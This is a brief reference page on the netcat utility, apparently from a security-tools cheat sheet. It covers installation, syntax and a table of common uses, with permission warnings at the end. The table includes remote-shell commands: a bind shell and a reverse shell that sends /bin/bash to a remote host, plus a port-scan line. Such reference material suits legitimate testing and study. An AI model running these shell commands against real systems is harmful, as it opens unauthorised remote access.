Netcat
Networking Swiss army knife for reading/writing network connections

Sniffing & Spoofing
Description
Netcat (nc) is a versatile networking utility that reads and writes data across network connections using TCP or UDP. It can create almost any kind of connection and is used for port scanning, file transfers, and creating backdoors.

Installation / Check
Check if installed:

which nc
Install command:

sudo apt install netcat
Basic Syntax
nc [options] <host> <port>
Common Commands
Command	What it does	When to use	Risk
nc -lvp 4444

Listen on port	Creating a listener for incoming connections	
nc 192.168.1.1 4444

Connect to port	Connecting to a remote listener	
nc -lvp 4444 -e /bin/bash

Bind shell	Creating a shell listener (dangerous!)	
nc 192.168.1.1 4444 -e /bin/bash

Reverse shell	Sending shell to listener	
nc -zv 192.168.1.1 1-1000

Port scan	Quick port scanning	
nc -lvp 1234 > file.txt

Receive file	File transfer (receiver)	
Step-by-Step Guide
1
Decide if you need listener (-l) or client mode
2
Choose appropriate port
3
Add verbose (-v) for more info
4
For shells, use -e with caution
5
Monitor connections and data transfer
Understanding the Output
Netcat shows connection status and passes raw data through. Everything typed is sent to the other end.

Important Warnings
•
Shells created with netcat are unencrypted
•
Bind shells are dangerous - anyone can connect
•
Use only on systems you own or have permission to test
